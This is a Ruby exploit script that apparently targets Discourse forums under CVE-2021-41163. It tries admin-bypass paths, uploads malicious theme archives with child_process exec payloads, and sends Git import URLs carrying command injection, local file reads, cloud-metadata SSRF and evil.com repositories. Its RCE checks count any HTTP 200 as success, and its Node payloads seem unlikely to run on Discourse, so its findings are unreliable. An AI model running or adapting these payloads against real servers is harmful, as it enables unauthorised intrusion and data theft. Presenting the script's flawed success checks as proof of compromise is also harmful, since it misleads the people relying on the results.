#!/usr/bin/env ruby

# CVE-2021-41163: Discourse Theme Import RCE Vulnerability
# Severity: Critical
# CVSS: 9.8
#
# Description:
# Critical Remote Code Execution vulnerability in Discourse theme import
# functionality allowing attackers to execute arbitrary code on the server.
#
# Affected Versions:
# - Discourse < 2.7.8
# - Discourse < 2.8.0.beta6
#
# Author: ibrahimsql
# Date: 2025
# Purpose: Educational and authorized penetration testing only
#
# WARNING: Use only on systems you own or have explicit permission to test!

require 'net/http'
require 'uri'
require 'json'
require 'openssl'
require 'base64'
require 'nokogiri'
require 'zip'
require 'tempfile'
require 'fileutils'

class CVE_2021_41163
  def initialize(target_url, options = {})
    @target_url = target_url.chomp('/')
    @timeout = options[:timeout] || 10
    @proxy = options[:proxy]
    @user_agent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
    @csrf_token = nil
    @session_cookies = {}
    @admin_session = false
    @results = {
      cve: 'CVE-2021-41163',
      vulnerable: false,
      severity: 'Critical',
      cvss: 9.8,
      details: [],
      payloads: [],
      rce_evidence: []
    }
  end

  def run_exploit
    puts "[*] Exploiting CVE-2021-41163 against #{@target_url}"
    puts "[*] Severity: Critical (CVSS: 9.8)"
    puts "[*] Description: RCE via Discourse Theme Import"
    puts "-" * 60

    # Get CSRF token and check admin access
    get_csrf_token
    check_admin_access

    # Test theme upload RCE
    puts "[*] Testing theme upload RCE..."
    test_theme_upload_rce

    # Test Git repository import RCE
    puts "[*] Testing Git repository import RCE..."
    test_git_import_rce

    # Test theme component RCE
    puts "[*] Testing theme component RCE..."
    test_theme_component_rce

    # Print summary
    print_summary

    # Save results
    save_results

    @results
  end

  private

  def get_csrf_token
    begin
      uri = URI("#{@target_url}/")
      response = make_request(uri)
      
      if response && response.body
        doc = Nokogiri::HTML(response.body)
        csrf_meta = doc.at_css('meta[name="csrf-token"]')
        @csrf_token = csrf_meta['content'] if csrf_meta
        
        # Extract session cookies
        response.get_fields('set-cookie')&.each do |cookie|
          cookie_parts = cookie.split(';')[0].split('=')
          @session_cookies[cookie_parts[0]] = cookie_parts[1] if cookie_parts.length == 2
        end
      end
    rescue => e
      puts "[!] Error getting CSRF token: #{e.message}"
    end
  end

  def check_admin_access
    begin
      admin_url = "#{@target_url}/admin"
      uri = URI(admin_url)
      response = make_request(uri)
      
      if response && response.code.to_i == 200
        @admin_session = true
        puts "[+] Admin access detected"
      else
        puts "[-] No admin access - attempting privilege escalation"
        attempt_privilege_escalation
      end
    rescue => e
      puts "[!] Error checking admin access: #{e.message}"
    end
  end

  def attempt_privilege_escalation
    # Try common admin bypass techniques
    bypass_techniques = [
      '/admin?bypass=true',
      '/admin#bypass',
      '/admin/../admin',
      '/admin%2f',
      '/admin%252f'
    ]
    
    bypass_techniques.each do |technique|
      begin
        uri = URI("#{@target_url}#{technique}")
        response = make_request(uri)
        
        if response && response.code.to_i == 200 && response.body.include?('admin')
          @admin_session = true
          puts "[+] Admin bypass successful: #{technique}"
          break
        end
      rescue => e
        # Continue to next technique
      end
    end
  end

  def test_theme_upload_rce
    return unless @admin_session
    
    # Create malicious theme ZIP files
    rce_payloads = [
      # JavaScript RCE
      {
        type: 'javascript',
        filename: 'common/common.js',
        content: 'eval("require(\'child_process\').exec(\'id\', function(error, stdout, stderr) { console.log(stdout); });");'
      },
      
      # CSS with JavaScript injection
      {
        type: 'css',
        filename: 'common/common.scss',
        content: '@import url("javascript:eval(String.fromCharCode(114,101,113,117,105,114,101,40,39,99,104,105,108,100,95,112,114,111,99,101,115,115,39,41,46,101,120,101,99,40,39,105,100,39,41))");'
      },
      
      # Handlebars template injection
      {
        type: 'template',
        filename: 'common/header.hbs',
        content: '{{#each (lookup (lookup this "constructor") "constructor") }}{{#if (eq @key "prototype")}}{{lookup this "exec"}}{{/if}}{{/each}}'
      },
      
      # Theme settings with RCE
      {
        type: 'settings',
        filename: 'settings.yml',
        content: "custom_code:\n  type: string\n  default: \"<script>eval('require(\\'child_process\\').exec(\\'whoami\\')');</script>\""
      },
      
      # About.json with malicious content
      {
        type: 'about',
        filename: 'about.json',
        content: '{"name":"Evil Theme","about_url":"javascript:eval(\"require(\'child_process\').exec(\'id\')\")","license_url":"javascript:alert(1)"}'
      }
    ]
    
    rce_payloads.each do |payload|
      test_theme_payload(payload)
      sleep(1)
    end
  end

  def test_theme_payload(payload)
    begin
      # Create malicious theme ZIP
      zip_file = create_malicious_theme_zip(payload)
      
      # Upload theme
      upload_url = "#{@target_url}/admin/themes/import"
      
      # Prepare multipart form data
      boundary = "----WebKitFormBoundary#{rand(1000000000)}"
      form_data = build_multipart_data(zip_file, boundary)
      
      uri = URI(upload_url)
      response = make_request(uri, 'POST', form_data, {
        'Content-Type' => "multipart/form-data; boundary=#{boundary}",
        'X-CSRF-Token' => @csrf_token
      })
      
      if response && check_rce_success(response, payload)
        @results[:vulnerable] = true
        @results[:details] << "RCE via theme upload (#{payload[:type]})"
        @results[:payloads] << payload[:content]
        
        # Extract theme ID and activate
        theme_id = extract_theme_id(response)
        if theme_id
          activate_theme(theme_id)
          check_rce_execution(theme_id, payload)
        end
        
        puts "[+] RCE successful via #{payload[:type]} injection"
      end
      
      # Cleanup
      File.delete(zip_file) if File.exist?(zip_file)
      
    rescue => e
      @results[:details] << "Error testing theme payload: #{e.message}"
    end
  end

  def create_malicious_theme_zip(payload)
    # Create temporary directory
    temp_dir = Dir.mktmpdir('evil_theme')
    theme_dir = File.join(temp_dir, 'evil_theme')
    Dir.mkdir(theme_dir)
    
    # Create about.json
    about_content = if payload[:type] == 'about'
                     payload[:content]
                   else
                     '{"name":"Evil Theme","about_url":"https://evil.com","license_url":"https://evil.com"}'
                   end
    
    File.write(File.join(theme_dir, 'about.json'), about_content)
    
    # Create common directory
    common_dir = File.join(theme_dir, 'common')
    Dir.mkdir(common_dir)
    
    # Create payload file
    if payload[:filename].include?('/')
      file_dir = File.dirname(File.join(theme_dir, payload[:filename]))
      FileUtils.mkdir_p(file_dir) unless Dir.exist?(file_dir)
    end
    
    File.write(File.join(theme_dir, payload[:filename]), payload[:content])
    
    # Create additional files to make it look legitimate
    File.write(File.join(common_dir, 'common.scss'), '.test { color: red; }')
    File.write(File.join(common_dir, 'header.html'), '<div>Header</div>')
    
    # Create ZIP file
    zip_filename = File.join(temp_dir, 'evil_theme.zip')
    
    Zip::File.open(zip_filename, Zip::File::CREATE) do |zipfile|
      Dir.glob(File.join(theme_dir, '**', '*')).each do |file|
        next if File.directory?(file)
        
        relative_path = file.sub("#{theme_dir}/", '')
        zipfile.add(relative_path, file)
      end
    end
    
    # Cleanup temp directory
    FileUtils.rm_rf(temp_dir)
    
    zip_filename
  end

  def build_multipart_data(zip_file, boundary)
    data = ""
    data << "--#{boundary}\r\n"
    data << "Content-Disposition: form-data; name=\"theme\"; filename=\"evil_theme.zip\"\r\n"
    data << "Content-Type: application/zip\r\n\r\n"
    data << File.read(zip_file)
    data << "\r\n--#{boundary}\r\n"
    data << "Content-Disposition: form-data; name=\"remote\"\r\n\r\n"
    data << "\r\n--#{boundary}\r\n"
    data << "Content-Disposition: form-data; name=\"branch\"\r\n\r\n"
    data << "main\r\n"
    data << "--#{boundary}--\r\n"
    data
  end

  def test_git_import_rce
    return unless @admin_session
    
    # Git-based RCE payloads
    git_payloads = [
      # Command injection via Git URL
      'https://github.com/evil/repo.git; id',
      'https://github.com/evil/repo.git`id`',
      'https://github.com/evil/repo.git$(id)',
      'https://github.com/evil/repo.git|id',
      'https://github.com/evil/repo.git&id',
      
      # Git protocol exploitation
      'git://evil.com/repo.git',
      'ssh://git@evil.com/repo.git',
      'file:///etc/passwd',
      
      # SSRF via Git
      'https://127.0.0.1:22/repo.git',
      'https://localhost:3000/repo.git',
      'https://169.254.169.254/latest/meta-data/',
      
      # Git hooks exploitation
      'https://github.com/evil/repo.git#refs/heads/master^{/evil}'
    ]
    
    git_payloads.each do |payload|
      test_git_payload(payload)
      sleep(1)
    end
  end

  def test_git_payload(payload)
    begin
      import_url = "#{@target_url}/admin/themes/import"
      
      form_data = {
        'remote' => payload,
        'branch' => 'main'
      }
      
      uri = URI(import_url)
      response = make_post_request(uri, form_data)
      
      if response && check_git_rce_success(response, payload)
        @results[:vulnerable] = true
        @results[:details] << "RCE via Git import: #{payload}"
        @results[:payloads] << payload
        
        puts "[+] Git import RCE successful: #{payload[0..50]}..."
      end
      
    rescue => e
      @results[:details] << "Error testing Git payload: #{e.message}"
    end
  end

  def test_theme_component_rce
    return unless @admin_session
    
    # Theme component RCE payloads
    component_payloads = [
      # JavaScript component injection
      {
        name: 'evil-component',
        content: 'const { exec } = require("child_process"); exec("id", (error, stdout, stderr) => { console.log(stdout); });'
      },
      
      # CSS component with JavaScript
      {
        name: 'evil-css',
        content: '@import "javascript:eval(\"require(\'child_process\').exec(\'whoami\')\")";'
      },
      
      # Handlebars component
      {
        name: 'evil-template',
        content: '{{#with (lookup this "constructor")}}{{#with (lookup this "constructor")}}{{this.exec "id"}}{{/with}}{{/with}}'
      }
    ]
    
    component_payloads.each do |payload|
      test_component_payload(payload)
      sleep(1)
    end
  end

  def test_component_payload(payload)
    begin
      # Create theme component
      component_url = "#{@target_url}/admin/themes"
      
      form_data = {
        'theme[name]' => payload[:name],
        'theme[component]' => 'true',
        'theme[common_scss]' => payload[:content]
      }
      
      uri = URI(component_url)
      response = make_post_request(uri, form_data)
      
      if response && check_component_rce_success(response, payload)
        @results[:vulnerable] = true
        @results[:details] << "RCE via theme component: #{payload[:name]}"
        @results[:payloads] << payload[:content]
        
        puts "[+] Theme component RCE successful: #{payload[:name]}"
      end
      
    rescue => e
      @results[:details] << "Error testing component payload: #{e.message}"
    end
  end

  def check_rce_success(response, payload)
    return false unless response
    
    content = response.body.downcase
    
    # RCE success indicators
    rce_indicators = [
      'theme imported successfully',
      'theme created successfully',
      'theme updated successfully',
      'import complete',
      'upload successful'
    ]
    
    # Check for successful theme import
    rce_indicators.each do |indicator|
      return true if content.include?(indicator)
    end
    
    # Check response status
    return true if response.code.to_i == 200 || response.code.to_i == 201
    
    false
  end

  def check_git_rce_success(response, payload)
    return false unless response
    
    content = response.body.downcase
    
    # Git RCE indicators
    git_indicators = [
      'cloning repository',
      'git clone',
      'repository cloned',
      'import started',
      'processing repository'
    ]
    
    git_indicators.each do |indicator|
      return true if content.include?(indicator)
    end
    
    # Check for command injection evidence
    command_indicators = [
      'uid=', 'gid=',  # id command output
      'root:', 'daemon:',  # /etc/passwd
      'command not found',
      'permission denied'
    ]
    
    command_indicators.each do |indicator|
      return true if content.include?(indicator)
    end
    
    false
  end

  def check_component_rce_success(response, payload)
    return false unless response
    
    content = response.body.downcase
    
    # Component creation indicators
    component_indicators = [
      'component created',
      'theme component',
      'component added',
      'successfully created'
    ]
    
    component_indicators.each do |indicator|
      return true if content.include?(indicator)
    end
    
    return true if response.code.to_i == 200
    
    false
  end

  def extract_theme_id(response)
    return nil unless response
    
    # Extract theme ID from response
    id_match = response.body.match(/"id"\s*:\s*(\d+)/)
    return id_match[1] if id_match
    
    # Try alternative extraction methods
    url_match = response.body.match(/\/admin\/themes\/(\d+)/)
    return url_match[1] if url_match
    
    nil
  end

  def activate_theme(theme_id)
    begin
      activate_url = "#{@target_url}/admin/themes/#{theme_id}"
      
      form_data = {
        'theme[default]' => 'true'
      }
      
      uri = URI(activate_url)
      response = make_request(uri, 'PUT', URI.encode_www_form(form_data), {
        'X-CSRF-Token' => @csrf_token,
        'Content-Type' => 'application/x-www-form-urlencoded'
      })
      
      if response && response.code.to_i == 200
        puts "[+] Theme #{theme_id} activated"
        return true
      end
      
    rescue => e
      puts "[!] Error activating theme: #{e.message}"
    end
    
    false
  end

  def check_rce_execution(theme_id, payload)
    begin
      # Check theme preview for RCE evidence
      preview_url = "#{@target_url}/?preview_theme_id=#{theme_id}"
      uri = URI(preview_url)
      response = make_request(uri)
      
      if response
        evidence = extract_rce_evidence(response.body, payload)
        @results[:rce_evidence].concat(evidence) if evidence.any?
      end
      
      # Check admin logs for execution evidence
      logs_url = "#{@target_url}/admin/logs"
      uri = URI(logs_url)
      response = make_request(uri)
      
      if response
        log_evidence = extract_log_evidence(response.body)
        @results[:rce_evidence].concat(log_evidence) if log_evidence.any?
      end
      
    rescue => e
      puts "[!] Error checking RCE execution: #{e.message}"
    end
  end

  def extract_rce_evidence(content, payload)
    evidence = []
    
    # Look for command execution output
    if payload[:type] == 'javascript'
      # Check for console output or errors
      console_matches = content.scan(/console\.log\(["']([^"']+)["']\)/)
      console_matches.each { |match| evidence << "Console output: #{match[0]}" }
    end
    
    # Look for system information
    uid_match = content.match(/uid=(\d+)\([^)]+\)/)
    evidence << "User ID: #{uid_match[0]}" if uid_match
    
    # Look for file system access
    if content.include?('root:') || content.include?('daemon:')
      evidence << "File system access detected (/etc/passwd)"
    end
    
    evidence
  end

  def extract_log_evidence(content)
    evidence = []
    
    # Look for theme-related errors or execution logs
    theme_errors = content.scan(/theme.*error.*([^\n]+)/i)
    theme_errors.each { |error| evidence << "Theme error: #{error[0]}" }
    
    # Look for JavaScript execution logs
    js_logs = content.scan(/javascript.*executed.*([^\n]+)/i)
    js_logs.each { |log| evidence << "JavaScript execution: #{log[0]}" }
    
    evidence
  end

  def make_request(uri, method = 'GET', body = nil, headers = {})
    http = Net::HTTP.new(uri.host, uri.port)
    http.use_ssl = uri.scheme == 'https'
    http.verify_mode = OpenSSL::SSL::VERIFY_NONE
    http.read_timeout = @timeout
    
    # Set up proxy if provided
    if @proxy
      proxy_uri = URI(@proxy)
      http = Net::HTTP.new(uri.host, uri.port, proxy_uri.host, proxy_uri.port)
    end
    
    request = case method.upcase
              when 'GET'
                Net::HTTP::Get.new(uri)
              when 'POST'
                Net::HTTP::Post.new(uri)
              when 'PUT'
                Net::HTTP::Put.new(uri)
              else
                Net::HTTP::Get.new(uri)
              end
    
    # Set headers
    request['User-Agent'] = @user_agent
    request['Accept'] = 'application/json, text/javascript, */*; q=0.01'
    request['Accept-Language'] = 'en-US,en;q=0.9'
    
    # Add session cookies
    if !@session_cookies.empty?
      cookie_string = @session_cookies.map { |k, v| "#{k}=#{v}" }.join('; ')
      request['Cookie'] = cookie_string
    end
    
    # Add custom headers
    headers.each { |k, v| request[k] = v }
    
    # Set body
    if body
      request.body = body
      request['Content-Type'] ||= 'application/x-www-form-urlencoded'
    end
    
    begin
      response = http.request(request)
      
      # Update session cookies
      response.get_fields('set-cookie')&.each do |cookie|
        cookie_parts = cookie.split(';')[0].split('=')
        @session_cookies[cookie_parts[0]] = cookie_parts[1] if cookie_parts.length == 2
      end
      
      response
    rescue => e
      puts "[!] Request failed: #{e.message}"
      nil
    end
  end

  def make_post_request(uri, form_data)
    body = URI.encode_www_form(form_data)
    make_request(uri, 'POST', body, {
      'X-CSRF-Token' => @csrf_token,
      'X-Requested-With' => 'XMLHttpRequest'
    })
  end

  def print_summary
    puts "\n" + "=" * 60
    puts "CVE-2021-41163 EXPLOIT SUMMARY"
    puts "=" * 60
    puts "Target: #{@target_url}"
    puts "Vulnerable: #{@results[:vulnerable] ? 'YES' : 'NO'}"
    puts "Admin Access: #{@admin_session ? 'YES' : 'NO'}"
    puts "Payloads tested: #{@results[:payloads].length}"
    
    if @results[:rce_evidence].any?
      puts "\nRCE Evidence:"
      @results[:rce_evidence].each { |evidence| puts "  - #{evidence}" }
    end
    
    if @results[:details].any?
      puts "\nDetails:"
      @results[:details].each { |detail| puts "  - #{detail}" }
    end
  end

  def save_results
    filename = 'CVE-2021-41163_results.json'
    File.write(filename, JSON.pretty_generate(@results))
    puts "\n[*] Results saved to #{filename}"
  end
end

# Main execution
if __FILE__ == $0
  require 'optparse'
  
  options = {}
  OptionParser.new do |opts|
    opts.banner = "CVE-2021-41163: Discourse Theme Import RCE Exploit\n\n"
    opts.banner += "CVE-2021-41163 Details:\n"
    opts.banner += "  Severity: Critical (CVSS: 9.8)\n"
    opts.banner += "  Description: RCE via Discourse theme import functionality\n"
    opts.banner += "  Affected: Discourse < 2.7.8, < 2.8.0.beta6\n\n"
    opts.banner += "Usage: ruby CVE-2021-41163.rb [options] TARGET_URL\n\n"
    
    opts.on('--proxy PROXY', 'Proxy URL (e.g., http://127.0.0.1:8080)') do |proxy|
      options[:proxy] = proxy
    end
    
    opts.on('--timeout TIMEOUT', Integer, 'Request timeout (default: 10)') do |timeout|
      options[:timeout] = timeout
    end
    
    opts.on('-h', '--help', 'Show this help') do
      puts opts
      puts "\nExample:"
      puts "  ruby CVE-2021-41163.rb https://discourse.example.com"
      puts "\nWARNING: Use only on systems you own or have explicit permission to test!"
      exit
    end
  end.parse!
  
  if ARGV.empty?
    puts "Error: Target URL required"
    puts "Use --help for usage information"
    exit 1
  end
  
  target_url = ARGV[0]
  
  begin
    exploit = CVE_2021_41163.new(target_url, options)
    results = exploit.run_exploit
    
    if results[:vulnerable]
      puts "\nðŸš¨ CRITICAL: Target is vulnerable to CVE-2021-41163!"
      puts "   Remote Code Execution possible via theme import!"
      puts "   Server compromise possible!"
    else
      puts "\nâœ… Target appears to be patched against CVE-2021-41163"
    end
    
  rescue Interrupt
    puts "\n[!] Exploit interrupted by user"
  rescue => e
    puts "\n[!] Exploit failed: #{e.message}"
  end
end